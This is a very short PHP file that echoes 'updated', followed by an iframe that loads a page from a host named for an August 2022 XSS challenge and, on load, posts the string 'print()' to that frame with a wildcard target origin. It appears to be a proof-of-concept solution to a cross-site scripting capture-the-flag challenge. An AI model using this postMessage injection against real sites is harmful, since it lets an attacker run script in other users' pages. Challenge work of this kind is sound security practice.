<?php
echo 'updated';
?>
<iframe src="https://august-2022-bc-xss-challenge.herokuapp.com/frame.php" onload="this.contentWindow.postMessage('print()','*')">
